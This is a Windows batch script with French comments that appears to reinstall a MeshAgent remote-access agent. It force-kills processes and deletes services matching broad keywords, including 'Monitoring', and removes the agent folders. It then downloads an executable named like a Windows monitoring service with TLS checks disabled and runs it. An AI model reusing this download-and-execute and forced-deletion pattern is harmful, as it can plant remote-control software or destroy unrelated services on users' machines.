@echo off
setlocal enabledelayedexpansion

:: Configuration
set "LDIR=C:\Temp"
set "LFILE=%LDIR%\agent_maintenance.log"
set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"

if not exist "%LDIR%" mkdir "%LDIR%"
echo [START] %DATE% %TIME% >> "%LFILE%"

:: 1. Verif Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Droits admin manquants. >> "%LFILE%"
    exit /b 1
)

:: 2. Arrêt des services et processus par force brute
echo [2] Arret des services et processus... >> "%LFILE%"

:: Tuer spécifiquement le fautif vu dans tes logs
taskkill /F /IM "LGTW-Agent.exe" /T >> "%LFILE%" 2>&1
taskkill /F /IM "WindowsMonitoringService64-Lol.exe" /T >> "%LFILE%" 2>&1

:: Tuer TOUT ce qui tourne dans les dossiers cibles (méthode infaillible)
wmic process where "ExecutablePath like '%%Program Files%%Mesh Agent%%'" delete >> "%LFILE%" 2>&1
wmic process where "ExecutablePath like '%%Program Files%%LGTW%%'" delete >> "%LFILE%" 2>&1

:: Arrêt de tous les services potentiels
for /f "tokens=2 delims= " %%s in ('sc query state^= all ^| findstr /i "Mesh LGTW Monitoring"') do (
    sc stop "%%s" >> "%LFILE%" 2>&1
    sc delete "%%s" >> "%LFILE%" 2>&1
)

timeout /t 3 /nobreak >nul

:: 3. Nettoyage des dossiers
echo [3] Nettoyage dossiers... >> "%LFILE%"
set "D1=%ProgramFiles%\Mesh Agent"
set "D2=%ProgramFiles%\LGTW"
set "D3=%ProgramFiles(x86)%\Mesh Agent"

for %%D in ("%D1%" "%D2%" "%D3%") do (
    if exist "%%~D" (
        echo [INFO] Tentative sur %%~D >> "%LFILE%"
        :: Force le déverrouillage des fichiers
        takeown /f "%%~D" /r /d y >> "%LFILE%" 2>&1
        icacls "%%~D" /grant administrators:F /t >> "%LFILE%" 2>&1
        rd /s /q "%%~D" >> "%LFILE%" 2>&1
        
        if exist "%%~D" (
            echo [ALERTE] Toujours la... Renommage de secours. >> "%LFILE%"
            ren "%%~D" "OLD_AGENT_%RANDOM%" >> "%LFILE%" 2>&1
        ) else (
            echo [OK] Dossier %%~D supprime. >> "%LFILE%"
        )
    )
)

:: 4. Telechargement
echo [4] Telechargement de WindowsMonitoringService64-Lol.exe... >> "%LFILE%"
curl -L -k -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1

if not exist "%T_EXE%" (
    echo [ERREUR] Echec telechargement. >> "%LFILE%"
    goto :final
)

:: 5. Execution
echo [5] Lancement du nouvel agent... >> "%LFILE%"
start "" "%T_EXE%"
echo [OK] Execution lancee. >> "%LFILE%"

:: 6. Nettoyage
timeout /t 10 /nobreak >nul
if exist "%T_EXE%" del /f /q "%T_EXE%" >> "%LFILE%" 2>&1

:final
echo [END] %DATE% %TIME% >> "%LFILE%"
echo -------------------------- >> "%LFILE%"
exit /b 0
